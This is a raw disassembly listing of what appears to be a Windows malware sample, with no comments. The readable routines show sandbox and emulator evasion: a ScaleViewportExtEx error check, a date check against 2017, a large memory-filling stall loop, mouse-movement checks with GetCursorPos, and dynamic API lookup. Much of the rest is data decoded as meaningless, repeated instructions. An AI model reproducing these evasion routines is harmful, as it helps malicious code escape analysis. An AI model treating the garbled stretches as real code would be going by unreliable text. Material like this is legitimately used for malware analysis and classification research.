lodsd [ esi ]
dec edi
lea ecx [ ebp - 0x49492627 ]
mov dh 0x40
scasd [ edi ]
arpl dx si
lodsd [ esi ]
loopne r-xdata
inc edi
inc edx
push eax
inc edi
loope r-xdata
fldenv [ ebp + 0x7dcf0bd9 ]
mov ebx ecx
fldcw [ ebp - 0x55355836 ]
and ah [ esi ]
jo r-xdata
loopne r-xdata
scasd [ edi ]
arpl ax si
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
retn 0x4f56
mov dh 0x29
mov [ 0xffffffffd9d9e54a ] al
iretd
iretd
arpl si dx
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
into
iretd
sub_476c78
fucomi st1
fstpnce st1
mov dh 0xb6
stosd [ edi ]
arpl si ax
jbe r-xdata
scasd [ edi ]
mov al [ 0x262626d6 ]
dec esi
add [ ebp + 0x4c ] al
mov cl 0x75
scasd [ edi ]
mov al [ 0x262626ce ]
into
lodsd [ esi ]
fwait
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
arpl si ax
inc edi
inc edx
push eax
inc edi
loope r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
iretd
retn 0x4f56
sub_476cb1
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d99b3e ] al
lodsd [ esi ]
and al 0xcf
push edx
loopne r-xdata
inc edi
inc edx
push eax
inc edi
loope r-xdata
fldenv [ ebp + 0x7dcf0bd9 ]
mov ebx ecx
fldcw [ ebp - 0x55355836 ]
and ah [ esi ]
jo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
iretd
retn 0x4f56
mov dh 0x29
mov [ 0xffffffffd9d9e54a ] al
iretd
iretd
sub_476cde
dec esi
xlat
cmp ecx [ edi + 0x66 ]
fst [ eax + 0x262626e2 ]
lodsd [ esi ]
fmul st6
test esi edi
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
iretd
sbb eax [ esi - 0x34 ]
sub [ es : ecx - 0x262620e5 ] esp
fst [ ebp + 0x66 ]
iretd
sub_476d02
adc al 0xdf
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl si dx
iretd
sub_476db4
in al dx
call 0x4131d1c5
scasd [ edi ]
push ebx
mov ch [ ebp - 0x3089d1ad ]
rcr dl 0xd9
fnstenv [ esi + 0x73af40b6 ]
inc esi
jo r-xdata
dec esp
fnstenv [ es : eax + 0x2626268a ]
stosd [ edi ]
fiadd [ eax - 0x51 ]
pop ebx
loopne r-xdata
stosd [ edi ]
mov ah [ esi ]
stosd [ edi ]
fadd [ eax - 0x51 ]
pop ebx
out dx al
adc eax 0x5baf40d9
in al dx
jns r-xdata
jae r-xdata
inc eax
scasd [ edi ]
jae r-xdata
dec esp
iretd
fstpnce st1
mov dh 0xb6
and eax 0xc97acfe6
fstpnce st1
fnstenv [ ecx + 0x2626268e ]
inc eax
scasd [ edi ]
pop ebx
mov dl 0x79
dec esp
pop esi
jl r-xdata
stosd [ edi ]
daa
inc eax
scasd [ edi ]
bound eax [ edx ]
adc eax 0xab7676e6
stosb [ edi ]
add bh [ edx + 0x77262626 ]
stosd [ edi ]
fsub st2
popad
inc eax
scasd [ edi ]
jae r-xdata
dec esp
arpl si si
iretd
inc ebx
inc eax
scasd [ edi ]
bound eax [ edx ]
sbb [ esi + 0x4c ] bh
dec esp
stosb [ edi ]
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
pop ebx
sahf
lodsd [ esi ]
fmul st7
mov al [ 0xffffffffb6d9d9c2 ]
mov dh 0x76
stosd [ edi ]
mov cl 0x8e
iretd
jl r-xdata
jle r-xdata
mov [ 0xffffffffd9d9dc9a ] eax
jbe r-xdata
mov dh 0xb6
push ebx
inc eax
scasd [ edi ]
jae r-xdata
mov [ 0xffffffffd9d9dae2 ] eax
jbe r-xdata
push esi
inc eax
scasd [ edi ]
bound eax [ edx ]
sbb bh [ esi + 0x4c ]
ja r-xdata
push edx
int1
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
dec esp
0x99cf
iretd
jl r-xdata
mov dh 0xb6
jae r-xdata
push 0x2
outsb
ja r-xdata
fcomp st1
fnstenv [ esi - 0x55 ]
jne r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
scasd [ edi ]
jae r-xdata
rcl [ ebp - 0x75 ] 0xec
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push j_sub_403878#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
jne r-xdata
fstpnce st1
mov dh 0x40
scasd [ edi ]
pop ebx
out 0xad al
fild [ eax - 0x51 ]
pop ebx
in al 0xad
fadd [ eax - 0x51 ]
pop ebx
loop r-xdata
inc eax
scasd [ edi ]
arpl [ ebp + ebp * 4 + 0x4ce615f0 ] cx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4770f1
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
call GetLastError
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
dec eax
inc eax
scasd [ edi ]
bound eax [ edx ]
jle r-xdata
mov [ 0xffffffffd9d9dc9a ] eax
jbe r-xdata
pushfd
fstpnce st1
mov dh 0x71
dec esp
daa
dec esi
cmpsb [ es : esi ] [ edi ]
fst [ ebx + 0x2e ]
iretd
jl r-xdata
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
push 0x0
push 0x0
call SelectClipPath
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x262638cd ] esp
jo r-xdata
scasd [ edi ]
imul eax [ eax - 0x779c50c0 ] 0xffffffad
nop
nop
mov ebx 0x1d09
nop
jmp r-xdata
push edx
inc eax
scasd [ edi ]
jae r-xdata
salc
iretd
nop
push 0x0
push 0x0
call SelectClipPath
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
call SelectClipPath
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
push 0x0
call SelectClipPath
mov ebx 0x9034
nop
nop
jmp r-xdata
push 0x0
push 0x0
call SelectClipPath
dec ebx
jne r-xdata
nop
nop
push 0x0
push 0x0
call SelectClipPath
nop
nop
push 0x4
push 0x3000
push 0x1cd385d3
push 0x0
call VirtualAlloc
mov esi eax
nop
test esi esi
je r-xdata
nop
mov ebx 0x1
nop
nop
mov ecx ebx
nop
lea eax [ ecx + 0x1 ]
push ecx
mov ecx 0x8c
xor edx edx
div ecx
pop ecx
add ecx esi
mov [ ecx ] dl
nop
inc ebx
cmp ebx 0x1cd376d5
jne r-xdata
nop
push 0x8000
push 0x0
push esi
call VirtualFree
mov ebx 0x8fdb
push 0x0
push 0x0
call SelectClipPath
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
push rw-data
call GetCursorPos
nop
push 0x0
push 0x0
call SelectClipPath
nop
nop
push 0x0
push 0xa
call SleepEx
nop
cmp ebx 0x2
jbe r-xdata
inc ebx
nop
mov eax [ edi ]
mov [ rw-data ] eax
nop
push edi
call GetCursorPos
nop
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x21
jbe r-xdata
nop
nop
push 0x0
call sub_471480
nop
nop
sub_476e48
in al 0xd9
fnstenv [ esi - 0x4949494a ]
mov dh 0x29
mov [ 0xffffffffd9d9c733 ] al
push edx
inc eax
scasd [ edi ]
jae r-xdata
salc
iretd
pushfd
fstpnce st1
mov dh 0x71
dec esp
daa
dec esi
cmpsb [ es : esi ] [ edi ]
fst [ ebx + 0x2e ]
iretd
jl r-xdata
jo r-xdata
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x262638cd ] esp
scasd [ edi ]
imul eax [ eax - 0x779c50c0 ] 0xffffffad
call 0x4131d1c5
scasd [ edi ]
push ebx
mov ch [ ebp - 0x3089d1ad ]
rcr dl 0xd9
fnstenv [ esi + 0x73af40b6 ]
inc esi
iretd
sub_476e67
dec esp
dec ecx
mov [ 0xffffffffd9d9dae2 ] eax
jbe r-xdata
push esi
inc eax
scasd [ edi ]
bound eax [ edx ]
sbb bh [ esi + 0x4c ]
jle r-xdata
mov [ 0xffffffffd9d9dc9a ] eax
jbe r-xdata
stosd [ edi ]
daa
inc eax
scasd [ edi ]
bound eax [ edx ]
adc eax 0xab7676e6
stosb [ edi ]
add bh [ edx + 0x77262626 ]
stosd [ edi ]
ja r-xdata
push edx
int1
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
dec esp
arpl si si
iretd
dec esp
stosb [ edi ]
xchg ebp eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
pop ebx
sahf
lodsd [ esi ]
fmul st7
mov al [ 0xffffffffb6d9d9c2 ]
mov dh 0x76
stosd [ edi ]
mov dh 0xb6
jae r-xdata
push 0x2
outsb
ja r-xdata
fcomp st1
fnstenv [ esi - 0x55 ]
jne r-xdata
dec esp
0x99cf
rcl [ ebp - 0x75 ] 0xec
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push j_sub_403878#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
jne r-xdata
iretd
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4770f1
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
call GetLastError
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
dec eax
inc eax
scasd [ edi ]
bound eax [ edx ]
jle r-xdata
mov [ 0xffffffffd9d9dc9a ] eax
jbe r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
scasd [ edi ]
jae r-xdata
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
push 0x0
push 0x0
call SelectClipPath
jmp r-xdata
fstpnce st1
mov dh 0x40
scasd [ edi ]
pop ebx
out 0xad al
fild [ eax - 0x51 ]
pop ebx
in al 0xad
fadd [ eax - 0x51 ]
pop ebx
loop r-xdata
inc eax
scasd [ edi ]
arpl [ ebp + ebp * 4 + 0x4ce615f0 ] cx
nop
nop
mov ebx 0x1d09
nop
jmp r-xdata
call 0x4131d1c5
scasd [ edi ]
push ebx
mov ch [ ebp - 0x3089d1ad ]
rcr dl 0xd9
fnstenv [ esi + 0x73af40b6 ]
inc esi
jo r-xdata
pushfd
fstpnce st1
mov dh 0x71
dec esp
daa
dec esi
cmpsb [ es : esi ] [ edi ]
fst [ ebx + 0x2e ]
iretd
jl r-xdata
nop
push 0x0
push 0x0
call SelectClipPath
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
call SelectClipPath
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
dec esp
fnstenv [ es : eax + 0x2626268a ]
stosd [ edi ]
fiadd [ eax - 0x51 ]
pop ebx
loopne r-xdata
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x262638cd ] esp
jo r-xdata
scasd [ edi ]
imul eax [ eax - 0x779c50c0 ] 0xffffffad
push 0x0
push 0x0
call SelectClipPath
mov ebx 0x9034
nop
nop
jmp r-xdata
stosd [ edi ]
mov ah [ esi ]
stosd [ edi ]
fadd [ eax - 0x51 ]
pop ebx
out dx al
adc eax 0x5baf40d9
in al dx
jns r-xdata
push edx
inc eax
scasd [ edi ]
jae r-xdata
salc
iretd
push 0x0
push 0x0
call SelectClipPath
dec ebx
jne r-xdata
nop
nop
push 0x0
push 0x0
call SelectClipPath
nop
nop
push 0x4
push 0x3000
push 0x1cd385d3
push 0x0
call VirtualAlloc
mov esi eax
nop
test esi esi
je r-xdata
jae r-xdata
inc eax
scasd [ edi ]
jae r-xdata
nop
mov ebx 0x1
inc ebx
inc eax
scasd [ edi ]
bound eax [ edx ]
sbb [ esi + 0x4c ] bh
dec esp
iretd
fstpnce st1
mov dh 0xb6
and eax 0xc97acfe6
fstpnce st1
fnstenv [ ecx + 0x2626268e ]
inc eax
scasd [ edi ]
pop ebx
mov dl 0x79
dec esp
pop esi
jl r-xdata
nop
nop
mov ecx ebx
nop
lea eax [ ecx + 0x1 ]
push ecx
mov ecx 0x8c
xor edx edx
div ecx
pop ecx
add ecx esi
mov [ ecx ] dl
nop
inc ebx
cmp ebx 0x1cd376d5
jne r-xdata
nop
push 0x8000
push 0x0
push esi
call VirtualFree
mov ebx 0x8fdb
fsub st2
popad
inc eax
scasd [ edi ]
jae r-xdata
push 0x0
push 0x0
call SelectClipPath
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
push rw-data
call GetCursorPos
nop
push 0x0
push 0x0
call SelectClipPath
mov cl 0x8e
iretd
jl r-xdata
nop
nop
push 0x0
push 0xa
call SleepEx
nop
cmp ebx 0x2
jbe r-xdata
inc ebx
nop
mov eax [ edi ]
mov [ rw-data ] eax
nop
mov dh 0xb6
push ebx
inc eax
scasd [ edi ]
jae r-xdata
push edi
call GetCursorPos
nop
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x21
jbe r-xdata
nop
nop
push 0x0
call sub_471480
nop
nop
sub_476f14
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403878#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476f40
retn
sub_477150
push esi
add [ eax ] al
add [ eax + 0x71 ] bl
inc edi
add [ eax + 0x5800405d ] cl
pop ebp
inc eax
add [ ebx + ebx * 2 + 0x40 ] bh
add [ eax ] ch
pop ebx
inc eax
add [ eax ] al
pop esi
inc eax
add al dl
pop ebp
inc eax
add [ ebx + ebp * 2 + 0x40 ] bl
add [ ebx + ebp * 2 ] ch
inc eax
add [ ebx + ebp * 2 + 0x6b640040 ] dl
inc eax
add ah al
adc eax [ ecx ]
xchg esp eax
adc eax [ ecx ]
mov ah 0x6e
inc eax
add [ esi + ebp * 2 - 0x289fffc0 ] al
inc eax
add [ eax ] ah
or eax [ ecx ]
mov [ ebx ] ss
inc ecx
add [ ebx + edx ] bh
inc ecx
add [ ebp + edi * 4 + 0x41 ] dl
add [ esp + edi * 4 + 0x53480041 ] ah
inc edx
add [ eax ] bl
push ebx
inc edx
add [ eax ] al
push esi
inc edx
add al dl
push ebp
inc edx
add [ esi + ebp * 2 + 0x6e740042 ] dh
inc edx
add [ esi + ebx * 2 + 0x42 ] bh
add [ esi + ebx * 2 + 0x42 ] cl
add ah bh
push esi
inc edx
add ah cl
push esi
inc edx
add [ eax ] cl
rol [ ecx ] 0xd8
rol [ ecx ] 0xc
push edx
inc edx
add [ eax ] bh
push ecx
inc edx
add [ eax - 0x43 ] bh
inc esp
add [ eax - 0x43 ] cl
inc esp
add [ esi + ebx * 2 + 0x5e8c0042 ] bh
inc edx
add [ ebx ] dh
inc ebp
add ah al
and al [ ebp ]
loopne r-xdata
inc ecx
add ah bh
or [ ecx ] al
push eax
or eax [ ecx ]
and [ ebx ] cl
inc ecx
add [ ebx + edx + 0x133c0041 ] cl
add al ah
aad 0x40
add ah cl
fild [ eax ]
pushfd
fild [ eax ]
je r-xdata
inc edx
add [ eax - 0x77ffbd7f ] dh
mov eax [ edx ]
xor al 0x8b
inc edx
add ah ch
mov [ edx ] es
mov esp 0xb400428c
mov [ edx ] es
test [ edx + eax * 2 + 0x428c7c00 ] cl
add [ esp + ecx * 4 + 0x42 ] cl
add [ esp + ecx * 4 + 0x42 ] al
add [ esp + ecx * 4 ] dl
inc edx
add [ eax - 0x73 ] bl
inc edx
add [ eax ] ch
lea eax [ edx ]
inc eax
xor al [ ebx ]
adc [ edx ] dh
inc ebx
add al al
jo r-xdata
inc edx
add ah bl
xor [ ebx ] al
xchg esp eax
xor [ ebx ] al
inc esp
xor [ ebx ] eax
cld
xor [ ebx ] al
jo r-xdata
add [ eax + 0xc004370 ] dl
outsd
inc edx
add ah bl
outsb
inc edx
add [ edi * 2 + 0x7ce00042 ] bl
inc edx
add al al
lea eax [ edx ]
nop
lea eax [ edx ]
clc
lea eax [ edx ]
enter 0x428d 0x0
cwde
mov [ edx ] 0x3c
mov [ edx ] 0x30
sti
inc edx
add al ch
cli
inc edx
add [ esp + ecx * 4 ] cl
inc edx
add ah bl
mov eax [ edx ]
aam 0x8b
inc edx
add [ ebx + ecx * 4 + 0x30dc0042 ] ah
inc ebx
add [ eax + esi + 0x31440043 ] dl
inc ebx
add ah bh
jno r-xdata
inc ebx
add [ eax ] bh
and eax [ ebx ]
je r-xdata
inc edx
add [ eax + eax * 4 ] al
inc edx
add al dl
out 0x45 eax
add [ edi + 0x45 ] dh
add [ eax - 0xc ] cl
inc ebp
add [ eax ] bl
hlt
add [ eax + 0x60004331 ] dh
xor [ ebx ] eax
or [ edx ] dh
inc ebx
add [ eax - 0x6fffbccf ] bh
sti
inc edx
add [ eax - 0x5 ] ah
inc edx
add al al
xor eax [ ebx ]
dec eax
xor eax [ ebx ]
call 0xffffffffa447b634
aas
inc ebx
add ah bh
mov eax [ eax + eax - 0x6c ]
mov eax [ eax + eax - 0x48 ]
mov eax [ 0xffffffffa1880044 ]
inc esp
add ah dh
jle r-xdata
inc ebx
add [ eax + esi + 0x43 ] al
add [ esp + edi * 8 + 0x42 ] bl
add [ esp + edi * 8 ] ch
inc edx
add ah dl
sti
inc edx
add [ eax + 0x280042fb ] bl
jb r-xdata
inc esi
add al ah
and eax [ esi ]
pushfd
and eax [ esi ]
call 0x2c47b987
sub al [ esi ]
cld
sub al 0x46
add ah cl
sub al 0x46
add [ eax + 0x70004630 ] ah
xor [ esi ] al
add [ esi + edi * 2 + 0x43 ] bh
add [ eax + eax * 4 ] dh
inc ebx
add al bh
sub_477371
xor eax [ esi ]
pop esp
xor eax [ esi ]
mov ah 0x39
inc esi
add [ ecx + edi + 0x46 ] ch
add [ eax + 0x78004642 ] ch
inc edx
inc esi
add [ ecx + ecx * 2 ] dl
inc esi
add ah ah
dec eax
inc esi
add [ ebx + ecx * 2 + 0x4b540046 ] al
inc esi
add [ esp + ecx * 4 - 0x738bffba ] ah
inc esi
add [ eax ] bl
dec ebp
inc esi
add al ch
dec esp
inc esi
add [ ebx + ecx * 2 + 0x4b8c0046 ] bh
inc esi
add [ eax + 0x5c ] cl
inc esi
add [ eax ] bl
pop esp
inc esi
add [ 0x64fc0046 ] ch
inc esi
add al dh
push eax
inc esi
add al al
push eax
inc esi
add [ eax + 0x5000465c ] al
pop esp
inc esi
add [ eax - 0x77ffb9a4 ] bh
pop esp
inc esi
add [ eax + 0x68004681 ] bl
add [ esi ] sub_468638
or [ esi + 0xee80046 ] al
inc edi
add [ eax + 0xe ] bh
inc edi
add ah bh
adc [ edi ] eax
int3
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_477150
call sub_405d14
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d224
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45d23c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d2bc
call sub_403d84
sub_401167
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40566c
sub_401171
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405680
sub_401234
jmp [ __import_lookup_table_1(user32:CharNextA) ]
sub_40123c
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401254
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_4012b4
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012d4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012f4
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401334
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ada
jmp sub_403878
sub_401ae1
mov al [ rw-data ]
pop ebp
retn
sub_401bbe
jmp sub_403878
sub_401c8c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022a0
retn
sub_40228c
jmp sub_403878
sub_402432
jmp sub_403878
sub_4026d1
jmp sub_403878
sub_402794
call sub_405cc8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405cc8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027e8
mov [ rw-data ] edx
call sub_403e5c
sub_40284c
push eax
push edx
push ecx
call sub_405cc8
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402840
retn
sub_402868
retn
sub_4028bc
retn
sub_4028c0
push ebx
call sub_405cc8
mov ebx [ eax + 0x4 ]
call sub_405cc8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402920
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402930
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4029cc
mov edx [ eax + 0x1c ]
call sub_402984
retn
sub_402c34
mov ecx 0xff
call sub_402c40
retn
sub_402c64
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402c80
jmp sub_402c80
sub_402c7d
retn
sub_40300d
jmp sub_403878
sub_403060
fninit
fwait
fldcw [ rw-data ]
retn
sub_4030b0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4030bc
push ebx
mov ebx eax
mov eax ebx
call sub_4030ec
call sub_4026e4
mov edx eax
mov eax ebx
call sub_403130
pop ebx
retn
sub_4030d8
push ebx
mov ebx eax
mov eax ebx
call sub_403188
mov eax ebx
call sub_402704
pop ebx
retn
sub_4030ec
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403114
call sub_4034b0
test dl dl
jle r-xdata
retn
call sub_403498
sub_4031d4
retn
sub_40325c
jmp sub_403878
sub_403263
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40336c
mov eax 0x8000ffff
retn
sub_403374
retn
sub_403378
retn
sub_40337c
retn
sub_403471
jmp sub_4035c4
sub_403476
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4038d8
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403498
sub_403498
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4034a0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4034b0
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4034c0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403588
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4035a4
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403971
retn
sub_403ab4
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b42
jmp sub_4035c4
sub_403ba2
jmp sub_4035c4
sub_403bbc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403ab4
mov [ rw-data ] 0x0
call sub_403b5c
retn
sub_403cf5
retn
sub_403e57
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403e5c
mov [ rw-data ] eax
call sub_403d84
sub_403ef0
push eax
call ExitThread
sub_40411c
retn
sub_404158
retn
sub_404166
retn
sub_40417f
retn
sub_404190
retn
sub_404277
retn
j_sub_4043c4#2
jmp sub_4043c4
sub_40440d
retn
sub_404415
retn
sub_404457
retn
sub_4045b0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402840
sub_4045c8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404720
retn
sub_404732
retn
sub_404734
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404928
mov ecx 0x1
jmp sub_404894
sub_404932
retn
sub_404968
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402840
call [ rw-data ]
retn
sub_404a6c
mov ecx 0x1
jmp sub_404980
sub_404a76
retn
sub_404a78
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402840
call [ rw-data ]
retn
sub_404c9e
retn
sub_404ca0
push edx
call sub_4026e4
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404928
pop eax
sub_404cb4
push eax
call sub_404a6c
pop eax
call sub_402704
retn
sub_404cc4
mov al 0x11
jmp sub_402840
sub_404cef
retn
sub_404d00
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404bac
pop ebp
retn 0x4
j_sub_404980
jmp sub_404980
sub_404d15
retn
sub_404d18
call sub_404eb8
retn
sub_404f44
call sub_404f1c
retn
sub_40528d
jmp sub_403878
sub_4053f8
call sub_405400
retn
sub_40542c
call sub_40543c
retn
sub_405434
call sub_40545c
retn
sub_40543c
push ebx
mov ebx eax
mov eax 0x8
call sub_4026e4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4054f7
jmp sub_4035c4
sub_405518
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_40558c
jmp sub_403878
sub_405593
pop ecx
pop ebp
retn
sub_40560c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405618
add eax 0x4
push eax
call sub_40131c
retn
sub_405624
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402840
sub_405634
call sub_4030bc
mov [ eax + 0x4 ] 0x1
retn
sub_40566c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_401314
pop ebp
retn 0x4
sub_40595b
jmp sub_403878
sub_405962
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4059ff
jmp sub_403878
sub_405a06
